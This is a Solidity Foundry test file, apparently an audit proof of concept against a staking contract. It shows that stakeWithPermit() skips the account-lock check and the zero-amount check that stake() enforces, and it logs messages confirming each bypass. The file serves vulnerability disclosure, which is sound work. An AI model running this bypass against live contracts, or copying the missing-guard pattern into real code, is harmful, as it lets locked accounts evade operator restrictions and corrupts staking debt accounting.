// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Run with:
//   cd ~/CCNext-smart-contracts
//   forge test --match-contract StakingIsLockedBypassPoc -vv

import "forge-std/Test.sol";
import {Staking}      from "../contracts/Staking/Staking.sol";
import {IStakingTypes} from "../contracts/Staking/IStakingTypes.sol";
import {ERC20Permit}  from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC20}        from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockTokenPermit is ERC20Permit {
    constructor() ERC20("SpaceCoin", "SPC") ERC20Permit("SpaceCoin") {
        _mint(msg.sender, 10_000_000 ether);
    }
}

contract StakingIsLockedBypassPoc is Test {
    uint256 constant OPERATOR_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant ALICE_KEY    = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address operator;
    address alice;
    Staking staking;
    MockTokenPermit token;

    uint256 constant STAKE_AMOUNT   = 1_000 ether;
    uint32  constant INTEREST_RATE  = 10_000;  // 10% APR

    bytes32 constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function setUp() public {
        operator = vm.addr(OPERATOR_KEY);
        alice    = vm.addr(ALICE_KEY);
        token    = new MockTokenPermit();
        staking  = new Staking(address(token), operator, INTEREST_RATE);

        token.transfer(alice, STAKE_AMOUNT * 2);
    }

    function _permitSig(address owner, uint256 ownerKey, uint256 amount, uint256 deadline)
        internal view returns (uint8 v, bytes32 r, bytes32 s)
    {
        uint256 nonce   = token.nonces(owner);
        bytes32 structH = keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(staking), amount, nonce, deadline));
        bytes32 digest  = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structH));
        (v, r, s)       = vm.sign(ownerKey, digest);
    }

    /// @notice Proves stakeWithPermit() bypasses the isLocked guard present in stake().
    ///         Operator locks Alice; stake() reverts; stakeWithPermit() SUCCEEDS.
    function test_stakeWithPermit_bypasses_isLocked() public {
        // Operator locks Alice's account
        vm.prank(operator);
        staking.lockOrUnlockAccount(alice, true);

        (,,,,, bool aliceLocked) = staking.stakeInfo(alice);
        assertTrue(aliceLocked, "Alice must be locked");
        console.log("[setup] Operator locked Alice's account");

        // stake() correctly reverts for locked Alice
        vm.prank(alice);
        vm.expectRevert(IStakingTypes.AccountIsLocked.selector);
        staking.stake(STAKE_AMOUNT);
        console.log("[check] stake() correctly reverts with AccountIsLocked");

        // stakeWithPermit() does NOT check isLocked -- BYPASS!
        uint256 deadline = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = _permitSig(alice, ALICE_KEY, STAKE_AMOUNT, deadline);

        vm.prank(alice);
        staking.stakeWithPermit(alice, STAKE_AMOUNT, STAKE_AMOUNT, deadline, v, r, s);

        (uint256 principal,) = staking.stakingReward(alice);
        assertEq(principal, STAKE_AMOUNT, "Locked account staked via permit -- bypass confirmed");

        (,,,,, bool stillLocked) = staking.stakeInfo(alice);
        console.log("[bypass] stakeWithPermit() SUCCEEDED for locked account!");
        console.log("[bypass] Alice is still locked:", stillLocked);
        console.log("[bypass] Alice's staked principal:", principal / 1 ether, "tokens");
        console.log("");
        console.log("=== BYPASS CONFIRMED ===");
        console.log("stakeWithPermit() missing: if (stakeInfo[owner].isLocked) revert AccountIsLocked()");
        console.log("Locked accounts can circumvent operator restrictions via permit path.");
    }

    /// @notice Proves stakeWithPermit() also accepts amountToStake == 0,
    ///         which stake() rejects with InvalidStakingAmount.
    ///         A zero-amount stake sets firstStakeTimestamp, affecting future debt calculation.
    function test_stakeWithPermit_allows_zero_amount() public {
        // stake() correctly reverts for zero amount
        vm.prank(alice);
        vm.expectRevert(IStakingTypes.InvalidStakingAmount.selector);
        staking.stake(0);
        console.log("[check] stake(0) correctly reverts with InvalidStakingAmount");

        // stakeWithPermit() accepts zero amount -- no check
        uint256 deadline = block.timestamp + 1 hours;
        (uint8 v, bytes32 r, bytes32 s) = _permitSig(alice, ALICE_KEY, 0, deadline);

        vm.prank(alice);
        staking.stakeWithPermit(alice, 0, 0, deadline, v, r, s);

        // firstStakeTimestamp was set by the zero-amount stake (field index 3)
        (,,, uint64 ts,,) = staking.stakeInfo(alice);
        assertGt(ts, 0, "firstStakeTimestamp set by zero-amount stake");

        console.log("[bypass] stakeWithPermit(0) SUCCEEDED -- firstStakeTimestamp set:", ts);
        console.log("[impact] Subsequent real stake enters totalDebt path,");
        console.log("         incurring debt from firstStakeTimestamp to now.");
        console.log("");
        console.log("=== ZERO-AMOUNT BYPASS CONFIRMED ===");
    }
}
